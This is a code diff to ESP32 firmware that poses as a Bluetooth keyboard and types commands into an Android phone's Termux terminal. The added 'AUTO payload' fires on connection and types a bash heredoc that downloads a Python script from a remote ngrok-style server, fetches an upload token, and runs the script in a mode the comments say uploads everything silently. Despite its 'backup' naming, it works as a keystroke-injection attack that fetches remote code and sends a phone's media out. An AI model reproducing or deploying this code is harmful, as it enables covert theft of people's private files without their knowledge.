@@ -44,6 +44,11 @@
 //               set to false → only GPIO 19 button fires the payload
 #define AUTO_TRIGGER   true
 
+// Setup password — must match SETUP_PASSWORD in server/.env
+// The ESP32 sends this to GET /setup-token to fetch and save the upload token
+// automatically on first run. Never transmitted wirelessly — typed into Termux.
+#define SETUP_PASSWORD "your_setup_password_here"  // ← set same value as in .env
+
 // How long to wait after BLE connects before injecting keystrokes.
 // Android needs ~3 s to register the keyboard and show the home screen.
 #define CONNECT_SETTLE_MS  3500
@@ -119,19 +124,50 @@ void openTermuxClean() {
   Serial.println("[payload] Prompt cleared.");
 }
 
-// ── AUTO payload — single one-liner via media_backup.py --auto ───────────────
-// Requires media_backup.py to be present at ~/media_backup.py on the device.
-// --auto flag skips all interactive prompts and uploads everything silently.
+// ── AUTO payload — self-installing + silent run ───────────────────────────────
+// Injects a bash heredoc that:
+//   1. Downloads media_backup.py if not already present
+//   2. Fetches and saves ~/.backup_token from /setup-token if not already present
+//   3. Runs media_backup.py --auto (fully non-interactive)
+// Everything is idempotent — safe to run on every connection.
 
 void runAutoPayload() {
-  Serial.println("[AUTO payload] Starting...");
+  Serial.println("[AUTO payload] Starting self-install + run...");
   openTermuxClean();
 
-  // STEP 3: type single command — fully non-interactive
-  typeString("python3 ~/media_backup.py " WAN_SERVER_URL " --auto", 35);
-  pressEnter(300);
+  // Inject bash heredoc — bash buffers all lines before executing,
+  // so the ESP32 only needs to wait for typing to finish.
+  typeLine("bash << 'SETUP_RUN_END'");
 
-  Serial.println("[AUTO payload] One-liner typed — media_backup.py running.");
+  // ── 1. Download media_backup.py if missing ──────────────────────────────
+  typeLine("if [ ! -f ~/media_backup.py ]; then");
+  typeLine("  echo '[setup] Downloading media_backup.py...'");
+  typeLine("  curl -sL -H 'ngrok-skip-browser-warning: true' \\");
+  typeLine("       -o ~/media_backup.py '" WAN_SERVER_URL "/payloads/media_backup.py'");
+  typeLine("  echo '[setup] media_backup.py saved.'");
+  typeLine("else");
+  typeLine("  echo '[setup] media_backup.py already present.'");
+  typeLine("fi");
+
+  // ── 2. Fetch and save ~/.backup_token if missing ────────────────────────
+  typeLine("if [ ! -f ~/.backup_token ]; then");
+  typeLine("  echo '[setup] Fetching backup token...'");
+  typeLine("  curl -sf -H 'ngrok-skip-browser-warning: true' \\");
+  typeLine("       -H 'X-Setup-Password: " SETUP_PASSWORD "' \\");
+  typeLine("       '" WAN_SERVER_URL "/setup-token' > ~/.backup_token");
+  typeLine("  chmod 600 ~/.backup_token");
+  typeLine("  echo '[setup] Token saved to ~/.backup_token.'");
+  typeLine("else");
+  typeLine("  echo '[setup] Token already present.'");
+  typeLine("fi");
+
+  // ── 3. Run media_backup.py non-interactively ────────────────────────────
+  typeLine("echo '[run] Starting upload...'");
+  typeLine("python3 ~/media_backup.py '" WAN_SERVER_URL "' --auto");
+
+  typeLine("SETUP_RUN_END");
+
+  Serial.println("[AUTO payload] Heredoc typed — setup+run executing in Termux.");
   Serial.println("[AUTO payload] Done.");
 }
 
